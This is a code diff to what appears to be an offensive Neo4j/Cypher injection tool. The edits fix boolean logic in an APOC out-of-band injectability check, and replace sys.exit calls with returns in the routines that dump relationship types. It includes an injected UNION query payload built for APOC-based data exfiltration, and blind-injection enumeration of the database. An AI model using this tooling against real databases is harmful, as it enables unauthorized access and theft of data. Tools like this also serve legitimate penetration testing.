@@ -180,6 +180,11 @@ class NetworkVisualizer:
         self.output_directory = output_directory
 
     def get_relationships(self, filename):
+        if not os.path.exists(filename):
+            # Open the file in 'w+' mode to create an empty file
+            with open(filename, 'w+') as file:
+                pass  # No need to do anything, just create the file if it doesn't exist
+
         lines = []
         with open(filename, 'r') as file:
             for line in file:
@@ -417,7 +422,7 @@ class oob_Neo4jInjector:
         for injection_character in injection_characters:
             print(f"[{animation[anim_index % len(animation)]}] Checking injectability with APOC", end='\r', flush=True)
             anim_index += 1
-            if (not csv or not apoc_csv):
+            if (not csv and not apoc_csv):
                 self.working_char = injection_character
             payload = f" RETURN 1 as x UNION WITH 1 as exfilData {apoc_json_exfil}"
             self.inject_payload(payload)
@@ -425,7 +430,7 @@ class oob_Neo4jInjector:
                 self.exfil_payload = apoc_json_exfil
                 apoc_json = True
                 break
-            if (csv or apoc_csv):
+            if (csv and apoc_csv):
                 break
 
         if (csv and (apoc_csv or apoc_json)):
@@ -579,7 +584,7 @@ class oob_Neo4jInjector:
         rel_types = get_data()
         if rel_types is None:
             print(colored("[!] WARNING, The database might not have any relationships. Exiting...", "red"))
-            sys.exit()
+            return
 
         rel_types = rel_types.split('::')
         print(f"\n[*] relationships types [{len(rel_types)}]:")
@@ -1120,7 +1125,7 @@ class ib_Neo4jInjector:
         for count_index in range(1000):
             if count_index == 999:
                 print(colored("[!] WARNING, The database might not have any relationships. Exiting...", "red"))
-                sys.exit()
+                return
             responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (node1)-[relationship]-(node2) RETURN DISTINCT(type(relationship))}} = {count_index}"))
             print(f"[{animation[anim_index % len(animation)]}] dumping relationship type counts, might take awhile", end='\r', flush=True)
             anim_index += 1
